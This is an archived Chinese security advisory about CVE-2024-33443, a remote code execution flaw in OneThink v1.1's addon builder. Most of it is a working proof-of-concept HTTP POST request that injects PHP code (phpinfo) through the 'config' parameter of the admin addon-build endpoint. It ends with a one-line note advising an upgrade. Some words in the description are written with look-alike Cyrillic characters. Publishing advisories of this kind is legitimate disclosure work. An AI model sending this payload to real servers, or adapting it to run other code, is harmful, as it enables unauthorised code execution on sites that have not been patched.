---
cve: "CVE-2024-33443"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【漏洞预警】onethink安全漏洞(CVE-2024-33443)   
cexlife  飓风网络安全   2024-04-30 22:58  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu017pmibR9qxxQPV8UCmoLyfibLIjyFP3Kl7zxF6bTia6QlFd0aRTpnKBEXKF0ic8cL6V001HibDMZAYzRw/640?wx_fmt=png&from=appmsg "")  
  
**漏洞描述:**  
  
оnеthinkv.1.1中的一个问题允许远程攻击者通过精心制作的脚本对AddоnѕCоntrоllеr.сlаѕѕ.php组件执行任意代码。  
  
****  
**poc:**  
  
POST /admin.php?s=/Addons/build.html HTTP/1.1Host: *******Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 1747Origin: ********DNT: 1Sec-GPC: 1Connection: closeReferer: *******Cookie: PHPSESSID=*********; onethink_admin___forward__=%2Fadmin.php%3Fs%3D%2FAddons%2Findex.htmlinfo%5Bname%5D=Examplepoi&info%5Btitle%5D=%E7%A4%BA%E5%88%97&info%5Bversion%5D=0.1&info%5Bauthor%5D=%E6%97%A0%E5%90%8D&info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B011&info%5Bstatus%5D=1&config=%3C%3Fphp%20phpinfo%28%29%3B%3F%3E&custom_config=&admin_list='model'%3D%3E'Example'%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09'fields'%3D%3E'*'%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09'map'%3D%3E''%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%8F%AF%E4%BB%A5%E5%86%8D%E6%8F%92%E4%BB%B6%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E9%87%8C%E5%8A%A8%E6%80%81%E9%87%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%0D%0A%09%09%09'order'%3D%3E'id+desc'%2C%09%09%2F%2F%E6%8E%92%E5%BA%8F%2C%0D%0A%09%09%09'list_grid'%3D%3Earray(+%09%09%2F%2F%E8%BF%99%E9%87%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E6%98%AF%E9%99%A4%E4%BA%86id%E5%BA%8F%E5%8F%B7%E5%A4%96%E7%9A%84%E8%A1%A8%E6%A0%BC%E9%87%8C%E5%AD%97%E6%AE%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A8%E5%A4%B4%E5%90%8D%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%B8%80%E6%A0%B7%E6%94%AF%E6%8C%81%E5%87%BD%E6%95%B0%E5%92%8C%E9%93%BE%E6%8E%A5%0D%0A++++++++++++++++'cover_id%7Cpreview_pic%3A%E5%B0%81%E9%9D%A2'%2C%0D%0A++++++++++++++++'title%3A%E4%B9%A6%E5%90%8D'%2C%0D%0A++++++++++++++++'description%3A%E6%8F%8F%E8%BF%B0'%2C%0D%0A++++++++++++++++'link_id%7Cget_link%3A%E5%A4%96%E9%93%BE'%2C%0D%0A++++++++++++++++'update_time%7Ctime_format%3A%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4'%2C%0D%0A++++++++++++++++'id%3A%E6%93%8D%E4%BD%9C%3A%5BEDIT%5D%7C%E7%BC%96%E8%BE%91%2C%5BDELETE%5D%7C%E5%88%A0%E9%99%A4'%0D%0A++++++++++++)%2C%0D%0A%09%09%09%09%09&custom_adminlist=&has_config=1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ibhQpAia4xu017pmibR9qxxQPV8UCmoLyfibPV8Ns2hSHqFaicytVQ1bBsL0ClQ70FOsoDg6iaRB3IDq5I5gmkeO1Kgw/640?wx_fmt=png&from=appmsg "")  
  
**修复方法:**目前官方已有可更新版本,建议受影响用户升级至最新版本.  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
